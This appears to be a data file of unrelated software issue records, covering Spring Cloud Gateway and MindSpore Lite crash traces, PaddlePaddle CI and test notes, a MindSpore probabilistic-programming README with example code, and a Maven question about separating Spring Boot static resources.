org.springframework.boot.diagnostics.AbstractFailureAnalyzer.analyze(AbstractFailureAnalyzer.java:33) ~[spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.diagnostics.FailureAnalyzers.analyze(FailureAnalyzers.java:110) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.diagnostics.FailureAnalyzers.reportException(FailureAnalyzers.java:103) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.reportFailure(SpringApplication.java:812) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.handleRunFailure(SpringApplication.java:797) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:322) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1214) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1203) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at com.bolecloud.dh.gateway.BoleDhGatewayApplication.main(BoleDhGatewayApplication.java:17) [classes/:na] Caused by: java.lang.ClassNotFoundException: org.springframework.jdbc.CannotGetJdbcConnectionException at java.net.URLClassLoader.findClass(URLClassLoader.java:381) ~[na:1.8.0_102] at java.lang.ClassLoader.loadClass(ClassLoader.java:424) ~[na:1.8.0_102] at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) ~[na:1.8.0_102] at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ~[na:1.8.0_102] at java.lang.Class.forName0(Native Method) ~[na:1.8.0_102] at java.lang.Class.forName(Class.java:348) ~[na:1.8.0_102] at sun.reflect.generics.factory.CoreReflectionFactory.makeNamedType(CoreReflectionFactory.java:114) ~[na:1.8.0_102] ... 20 common frames omitted 2019-09-20 14:48:53.243 ERROR 12072 --- [ main] o.s.boot.SpringApplication : Application run failed reactor.core.Exceptions$ErrorCallbackNotImplemented: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 Caused by: java.lang.IndexOutOfBoundsException: Index: 0, Size: 0 at java.util.ArrayList.rangeCheck(ArrayList.java:653) ~[na:1.8.0_102] at java.util.ArrayList.get(ArrayList.java:429) ~[na:1.8.0_102] at org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator.combinePredicates(RouteDefinitionRouteLocator.java:213) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.cloud.gateway.route.RouteDefinitionRouteLocator.convertToRoute(RouteDefinitionRouteLocator.java:142) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:100) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.drainLoop(FluxFlatMap.java:664) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.drain(FluxFlatMap.java:540) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapInner.onSubscribe(FluxFlatMap.java:924) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:139) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:63) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7921) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.onNext(FluxFlatMap.java:389) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.slowPath(FluxIterable.java:243) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.request(FluxIterable.java:201) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.onSubscribe(FluxFlatMap.java:335) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:139) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:63) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap.subscribe(FluxFlatMap.java:97) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxMap.subscribe(FluxMap.java:62) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxMap.subscribe(FluxMap.java:62) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7921) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.onNext(FluxFlatMap.java:389) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.slowPath(FluxIterable.java:243) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable$IterableSubscription.request(FluxIterable.java:201) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap$FlatMapMain.onSubscribe(FluxFlatMap.java:335) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:139) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxIterable.subscribe(FluxIterable.java:63) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxFlatMap.subscribe(FluxFlatMap.java:97) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoCollectList.subscribe(MonoCollectList.java:40) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoMapFuseable.subscribe(MonoMapFuseable.java:59) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoFlattenIterable.subscribe(MonoFlattenIterable.java:101) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxMaterialize.subscribe(FluxMaterialize.java:40) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoCollectList.subscribe(MonoCollectList.java:40) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoPeekFuseable.subscribe(MonoPeekFuseable.java:74) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.MonoFlattenIterable.subscribe(MonoFlattenIterable.java:101) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxDematerialize.subscribe(FluxDematerialize.java:39) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.FluxDefer.subscribe(FluxDefer.java:54) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7921) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribeWith(Flux.java:8085) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7914) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7878) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at reactor.core.publisher.Flux.subscribe(Flux.java:7796) ~[reactor-core-3.2.11.RELEASE.jar:3.2.11.RELEASE] at org.springframework.cloud.gateway.filter.WeightCalculatorWebFilter.lambda$onApplicationEvent$0(WeightCalculatorWebFilter.java:133) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.beans.factory.ObjectProvider.ifAvailable(ObjectProvider.java:93) ~[spring-beans-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.cloud.gateway.filter.WeightCalculatorWebFilter.onApplicationEvent(WeightCalculatorWebFilter.java:133) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:402) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:359) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.cloud.gateway.route.RouteRefreshListener.reset(RouteRefreshListener.java:68) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.cloud.gateway.route.RouteRefreshListener.onApplicationEvent(RouteRefreshListener.java:49) ~[spring-cloud-gateway-core-2.1.2.RELEASE.jar:2.1.2.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:402) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:359) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:896) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext.finishRefresh(ReactiveWebServerApplicationContext.java:115) ~[spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:552) ~[spring-context-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext.refresh(ReactiveWebServerApplicationContext.java:66) ~[spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:743) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:390) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:312) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1214) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1203) [spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at com.bolecloud.dh.gateway.BoleDhGatewayApplication.main(BoleDhGatewayApplication.java:17) [classes/:na]"
PR-CI-Windows fails,PR-CI-Windows fails on all recent PRs. Logs: The following tests FAILED: 135 - test_analyzer (Failed) 139 - test_api_impl (Failed) 140 - test_analysis_predictor (Failed) Everywhere reports the following error.   <code>: 2020-08-27 18:13:17 --------------------------------------2020-08-27 18:13:17 C++ Traceback (most recent call last): 2020-08-27 18:13:17 --------------------------------------2020-08-27 18:13:17 Windows not support stack backtrace yet. 2020-08-27 18:13:17 ----------------------2020-08-27 18:13:17 Error Message Summary: 2020-08-27 18:13:17 ----------------------2020-08-27 18:13:17 Error: Cannot open file C:/home/workspace/Paddle/../cache/third_party/a51876a5e506256316bae04bcdc6c2ea/inference_demo/word2vec/word2vec.inference.model/__model__ (at C:\home\workspace\Paddle\paddle\fluid\inference\io.cc:50)```
MDP README,"MindSpore Deep Probabilistic Programming The uncertainty estimation toolbox is based on MindSpore Deep Probabilistic Programming (MDP), and it is suitable for mainstream deep learning models, such as regression, classification, target detection and so on. In the inference stage, with the uncertainy estimation toolbox, developers only need to pass in the trained model and training dataset, specify the task and the samples to be estimated, then can obtain the aleatoric uncertainty and epistemic uncertainty. Based the uncertainty information, developers can understand the model and the dataset better. In classification task, for example, the model is lenet model. The MNIST dateset is used in the example. Data processing is consistent with Implementing an Image Classification Application in Tutorial. For evaluating the uncertainty of test examples, the use of the toolbox is as follows: Examples Examples in mindspore/tests/st/probability are as follows: Bayesian LeNet. How to construct and train a LeNet by bnn layers. Transform whole DNN model to BNN: How to transform whole DNN model to BNN. Transform DNN layer to BNN: How to transform one certainty type of layer in DNN model to corresponding Bayesian layer. Variational Auto-Encoder: Variational Auto-Encoder (VAE) model trained with MNIST to generate sample images. Conditional Variational Auto-Encoder: Conditional Variational Auto-Encoder (CVAE) model trained with MNIST to generate sample images. VAE-GAN: VAE-GAN model trained with MNIST to generate sample images. Uncertainty Estimation: Evaluate uncertainty of model and data.. Community As part of MindSpore, we are committed to creating an open and friendly environment. Gitee: Report bugs or make feature requests.   <code>: import mindspore.nn as nn from mindspore.nn.probability import bnn_layers class BNNLeNet5(nn.Cell): """""" bayesian Lenet network Args: num_class (int): Num classes. Default: 10. Returns: Tensor, output tensor Examples: &gt;&gt;&gt; BNNLeNet5(num_class=10) """""" def __init__(self, num_class=10): super(BNNLeNet5, self).__init__() self.num_class = num_class self.conv1 = bnn_layers.ConvReparam(1, 6, 5, stride=1, padding=0, has_bias=False, pad_mode=""valid"") self.conv2 = bnn_layers.ConvReparam(6, 16, 5, stride=1, padding=0, has_bias=False, pad_mode=""valid"") self.fc1 = bnn_layers.DenseReparam(16 * 5 * 5, 120) self.fc2 = bnn_layers.DenseReparam(120, 84) self.fc3 = bnn_layers.DenseReparam(84, self.num_class) self.relu = nn.ReLU() self.max_pool2d = nn.MaxPool2d(kernel_size=2, stride=2) self.flatten = nn.Flatten() self.reshape = P.Reshape() def construct(self, x): x = self.conv1(x) x = self.relu(x) x = self.max_pool2d(x) x = self.conv2(x) x = self.relu(x) x = self.max_pool2d(x) x = self.flatten(x) x = self.fc1(x) x = self.relu(x) x = self.fc2(x) x = self.relu(x) x = self.fc3(x) return x SoftmaxCrossEntropyWithLogits form mindspore.nn.loss import SoftmaxCrossEntropyWithLogits __main__ if __name__ == ""__main__"": ... # define the loss function criterion = SoftmaxCrossEntropyWithLogits(is_grad=False, sparse=True, reduction=""mean"") ... AdamWeightDecay optimizer = nn.AdamWeightDecay(params=network.trainable_params(), learning_rate=0.0001) backbone loss_fn dnn_factor bnn_factor if __name__ == ""__main__"": ... net_with_loss = bnn_layers.WithBNNLossCell(network, criterion, dnn_factor=60000, bnn_factor=0.000001) train_bnn_network = TrainOneStepCell(net_with_loss, optimizer) train_bnn_network.set_train() train_set = create_dataset('./mnist_data/train', 64, 1) test_set = create_dataset('./mnist_data/test', 64, 1) epoch = 100 for i in range(epoch): train_loss, train_acc = train_model(train_bnn_network, test_set) valid_acc = validate_model(network, test_set) print('Epoch: {} \tTraining Loss: {:.4f} \tTraining Accuracy: {:.4f} \tvalidation Accuracy: {:.4f}'.format(i, train_loss, train_acc, valid_acc)) import mindspore.nn as nn from mindspore.ops import operations as P from mindspore.nn.probability.dpn import VAE class Encoder(nn.Cell): def __init__(self): super(Encoder, self).__init__() self.fc1 = nn.Dense(1024, 800) self.fc2 = nn.Dense(800, 400) self.relu = nn.ReLU() self.flatten = nn.Flatten() def construct(self, x): x = self.flatten(x) x = self.fc1(x) x = self.relu(x) x = self.fc2(x) x = self.relu(x) return x class Decoder(nn.Cell): def __init__(self): super(Decoder, self).__init__() self.fc1 = nn.Dense(400, 1024) self.sigmoid = nn.Sigmoid() self.reshape = P.Reshape() def construct(self, z): z = self.fc1(z) z = self.reshape(z, IMAGE_SHAPE) z = self.sigmoid(z) return z encoder = Encoder() decoder = Decoder() vae = VAE(encoder, decoder, hidden_size=400, latent_size=20) from mindspore.nn.probability.infer import ELBO net_loss = ELBO(latent_prior='Normal', output_prior='Normal') optimizer = nn.Adam(params=vae.trainable_params(), learning_rate=0.001) net_with_loss = nn.WithLossCell(vae, net_loss) from mindspore.nn.probability.infer import SVI vi = SVI(net_with_loss=net_with_loss, optimizer=optimizer) vae = vi.run(train_dataset=ds_train, epochs=10) trained_loss = vi.get_train_loss() IMAGE_SHAPE = (-1, 1, 32, 32) generated_sample = vae.generate_sample(64, IMAGE_SHAPE) for sample in ds_train.create_dict_iterator(): sample_x = Tensor(sample['image'], dtype=mstype.float32) reconstructed_sample = vae.reconstruct_sample(sample_x) TransformToBNN from mindspore.common.initializer import TruncatedNormal import mindspore.nn as nn def conv(in_channels, out_channels, kernel_size, stride=1, padding=0): """"""weight initial for conv layer"""""" weight = weight_variable() return nn.Conv2d(in_channels, out_channels, kernel_size=kernel_size, stride=stride, padding=padding, weight_init=weight, has_bias=False, pad_mode=""valid"") def fc_with_initialize(input_channels, out_channels): """"""weight initial for fc layer"""""" weight = weight_variable() bias = weight_variable() return nn.Dense(input_channels, out_channels, weight, bias) def weight_variable(): """"""weight initial"""""" return TruncatedNormal(0.02) class LeNet5(nn.Cell): """""" Lenet network Args: num_class (int): Num classes. Default: 10. Returns: Tensor, output tensor Examples: &gt;&gt;&gt; LeNet5(num_class=10) """""" def __init__(self, num_class=10): super(LeNet5, self).__init__() self.num_class = num_class self.conv1 = conv(1, 6, 5) self.conv2 = conv(6, 16, 5) self.fc1 = fc_with_initialize(16 * 5 * 5, 120) self.fc2 = fc_with_initialize(120, 84) self.fc3 = fc_with_initialize(84, self.num_class) self.relu = nn.ReLU() self.max_pool2d = nn.MaxPool2d(kernel_size=2, stride=2) self.flatten = nn.Flatten() self.reshape = P.Reshape() def construct(self, x): x = self.conv1(x) x = self.relu(x) x = self.max_pool2d(x) x = self.conv2(x) x = self.relu(x) x = self.max_pool2d(x) x = self.flatten(x) x = self.fc1(x) x = self.relu(x) x = self.fc2(x) x = self.relu(x) x = self.fc3(x) return x if __name__ == ""__main__"": network = LeNet5() criterion = nn.SoftmaxCrossEntropyWithLogits(is_grad=False, sparse=True, reduction=""mean"") optimizer = nn.AdamWeightDecay(params=network.trainable_params(), learning_rate=0.0001) net_with_loss = WithLossCell(network, criterion) train_network = TrainOneStepCell(net_with_loss, optimizer) TransformToBNN __init__ TransformToBNN class TransformToBNN: def __init__(self, trainable_dnn, dnn_factor=1, bnn_factor=1): net_with_loss = trainable_dnn.network self.optimizer = trainable_dnn.optimizer self.backbone = net_with_loss.backbone_network self.loss_fn = getattr(net_with_loss, ""_loss_fn"") self.dnn_factor = dnn_factor self.bnn_factor = bnn_factor self.bnn_loss_file = None trainable_dnn dnn_factor bnn_factor dnn_factor bnn_factor from mindspore.nn.probability import transforms if __name__ == ""__main__"": ``` bnn_transformer = transforms.TransformToBNN(train_network, 60000, 0.000001) transform_to_bnn_model def transform_to_bnn_model(self, get_dense_args=lambda dp: {""in_channels"": dp.in_channels, ""has_bias"": dp.has_bias, ""out_channels"": dp.out_channels, ""activation"": dp.activation}, get_conv_args=lambda dp: {""in_channels"": dp.in_channels, ""out_channels"": dp.out_channels, ""pad_mode"": dp.pad_mode, ""kernel_size"": dp.kernel_size, ""stride"": dp.stride, ""has_bias"": dp.has_bias, ""padding"": dp.padding, ""dilation"": dp.dilation, ""group"": dp.group}, add_dense_args=None, add_conv_args=None): r"""""" Transform the whole DNN model to BNN model, and wrap BNN model by TrainOneStepCell. Args: get_dense_args (function): The arguments gotten from the DNN full connection layer. Default: lambda dp: {""in_channels"": dp.in_channels, ""out_channels"": dp.out_channels, ""has_bias"": dp.has_bias}. get_conv_args (function): The arguments gotten from the DNN convolutional layer. Default: lambda dp: {""in_channels"": dp.in_channels, ""out_channels"": dp.out_channels, ""pad_mode"": dp.pad_mode, ""kernel_size"": dp.kernel_size, ""stride"": dp.stride, ""has_bias"": dp.has_bias}. add_dense_args (dict): The new arguments added to BNN full connection layer. Default: {}. add_conv_args (dict): The new arguments added to BNN convolutional layer. Default: {}. Returns: Cell, a trainable BNN model wrapped by TrainOneStepCell. """""" get_dense_args get_conv_args add_dense_args add_conv_args add_dense_args get_dense_args add_conv_args get_conv_args if __name__ == ""__main__"": ``` train_bnn_network = bnn_transformer.transform_to_bnn_model() transform_to_bnn_layer def transform_to_bnn_layer(self, dnn_layer, bnn_layer, get_args, add_args={}): r"""""" Transform a specific type of layers in DNN model to corresponding BNN layer. Args: dnn_layer_type (Cell): The type of DNN layer to be transformed to BNN layer. The optional values are nn.Dense, nn.Conv2d. bnn_layer_type (Cell): The type of BNN layer to be transformed to. The optional values are DenseReparameterization, ConvReparameterization. get_args (dict): The arguments gotten from the DNN layer. Default: None. add_args (dict): The new arguments added to BNN layer. Default: None. Returns: Cell, a trainable model wrapped by TrainOneStepCell, whose sprcific type of layer is transformed to the corresponding bayesian layer. """""" dnn_layer bnn_layer get_args add_args if __name__ == ""__main__"": ``` train_bnn_network = bnn_transformer.transform_to_bnn_model() from mindspore.nn.probability.toolbox.uncertainty_evaluation import UncertaintyEvaluation from mindspore.train.serialization import load_checkpoint, load_param_into_net network = LeNet5() param_dict = load_checkpoint('checkpoint_lenet.ckpt') load_param_into_net(network, param_dict) # get train and eval dataset ds_train = create_dataset('workspace/mnist/train') ds_eval = create_dataset('workspace/mnist/test') evaluation = UncertaintyEvaluation(model=network, train_dataset=ds_train, task_type='classification', num_classes=10, epochs=1, epi_uncer_model_path=None, ale_uncer_model_path=None, save_model=False) for eval_data in ds_eval.create_dict_iterator(): eval_data = Tensor(eval_data['image'], mstype.float32) epistemic_uncertainty = evaluation.eval_epistemic_uncertainty(eval_data) aleatoric_uncertainty = evaluation.eval_aleatoric_uncertainty(eval_data)"
use Evaluator in several book tests,Add Evaluator and enable the test of pass accuracy in following tests:   <code>: test_image_classification_train test_recognize_digits_conv.py test_recognize_digits_mlp.py test_understand_sentiment_conv.py test_understand_sentiment_dynamic_lstm.py
静态资源分离,"使用maven插件将静态资源文件分离后，SpringBoot的jar包找不到模板的文件路径。maven配置如下   <code>: &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/webapp&lt;/directory&gt; &lt;excludes&gt; &lt;exclude&gt;html/&lt;/exclude&gt; &lt;exclude&gt;static/&lt;/exclude&gt; &lt;exclude&gt;upload/&lt;/exclude&gt; &lt;exclude&gt;templets/&lt;/exclude&gt; &lt;/excludes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;defaultGoal&gt;compile&lt;/defaultGoal&gt; &lt;finalName&gt;ms-mcms&lt;/finalName&gt; &lt;!-- 该插件用于复制依赖包到指定的文件夹里 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;copy-dependencies&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;copy-dependencies&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;outputDirectory&gt;${project.build.directory}/lib/&lt;/outputDirectory&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- 该插件用于复制配置文件到指定的文件夹里 --&gt; &lt;plugin&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;copy-resources&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;copy-resources&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;!-- &lt;include&gt;*.properties&lt;/include&gt; --&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/webapp&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/upload/**&lt;/include&gt; &lt;include&gt;static/**&lt;/include&gt; &lt;include&gt;templets/**&lt;/include&gt; &lt;include&gt;upload/**&lt;/include&gt; &lt;include&gt;html/**&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;outputDirectory&gt;${project.build.directory}/resources&lt;/outputDirectory&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- Spring Boot打包插件，把maven-jar-plugin打成的jar包重新打成可运行jar包 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;!-- 重写包含依赖，包含不存在的依赖，jar里没有pom里的依赖 --&gt; &lt;includes&gt; &lt;include&gt; &lt;groupId&gt;non-exists&lt;/groupId&gt; &lt;artifactId&gt;non-exists&lt;/artifactId&gt; &lt;/include&gt; &lt;/includes&gt; &lt;layout&gt;ZIP&lt;/layout&gt; &lt;!-- 使用外部配置文件，jar包里没有资源文件 --&gt; &lt;addResources&gt;true&lt;/addResources&gt; &lt;outputDirectory&gt;${project.build.directory}/resources&lt;/outputDirectory&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;!--配置jar包特殊标识 配置后，保留原文件，生成新文件 *-run.jar --&gt; &lt;!--配置jar包特殊标识 不配置，原文件命名为 *.jar.original，生成新文件 *.jar --&gt; &lt;!--&lt;classifier&gt;run&lt;/classifier&gt; --&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n -Dloader.path=resources,lib -jar ms-mcms.jar"
Change class to struct in GemmFunctor to avoid errors on special compilers,"Since compiling error was encountered when compiled by native compilers and , will it be better to change to .   <code>: class template 'BlasGemm' was previously declared as a struct template c++ cc template class BlasGemm&lt;DEVICE_TYPE_CPU, real&gt; template struct BlasGemm&lt;DEVICE_TYPE_CPU, real&gt;"
"[MS][LITE][master][delegate]NPU+ml_video_edit_hair_dyeing_migrate_v2, crash",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: NPU_FP32/FP16+ml_video_edit_hair_dyeing_migrate_v2,端侧推理，验证精度。预期精度对比成功，实际模型在部分手机crash H4K5T20C17006495,mate40pro 图运行失败，crash, 空指针 H8B6R19C02005482,nova5 图运行失败，crash, 空指针 PYB4C20A27005353,荣耀30 图运行失败，crash, 空指针 07-05 17:32:31.306 14848 14848 F DEBUG : Build fingerprint: 'HONOR/BMH-AN20/HWBMH:10/HUAWEIBMH-AN20/11.0.0.140C00:user/release-keys' 07-05 17:32:31.306 14848 14848 F DEBUG : Revision: '0' 07-05 17:32:31.306 14848 14848 F DEBUG : ABI: 'arm64' 07-05 17:32:31.309 14848 14848 F DEBUG : SYSVMTYPE: Maple 07-05 17:32:31.309 14848 14848 F DEBUG : APPVMTYPE: Art 07-05 17:32:31.309 14848 14848 F DEBUG : Timestamp: 2021-07-05 17:32:31+0800 07-05 17:32:31.309 14848 14848 F DEBUG : pid: 14762, tid: 14763, name: ActorThread_0 &gt;&gt;&gt; ./new_net_test_mslite &lt;&lt;&lt; 07-05 17:32:31.309 14848 14848 F DEBUG : uid: 2000 07-05 17:32:31.309 14848 14848 F DEBUG : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0 07-05 17:32:31.309 14848 14848 F DEBUG : Cause: null pointer dereference 07-05 17:32:31.309 14848 14848 F DEBUG : x0 0000007235dfb0b8 x1 0000000000000000 x2 0000005624ccf348 x3 0000007237d43990 07-05 17:32:31.309 14848 14848 F DEBUG : x4 0000007237d43988 x5 000000723754ea28 x6 00000072205f14f8 x7 00000072205f14f8 07-05 17:32:31.309 14848 14848 F DEBUG : x8 00000072378d5560 x9 0000000000000000 x10 0000007236ffcab0 x11 00000072378c7c00 07-05 17:32:31.309 14848 14848 F DEBUG : x12 0000000000000002 x13 0000000000000005 x14 0000000000000030 x15 aaaaaaaaaaaaaaab 07-05 17:32:31.309 14848 14848 F DEBUG : x16 00000072380e5950 x17 00000072380d9eb0 x18 0000007233424000 x19 0000007237859318 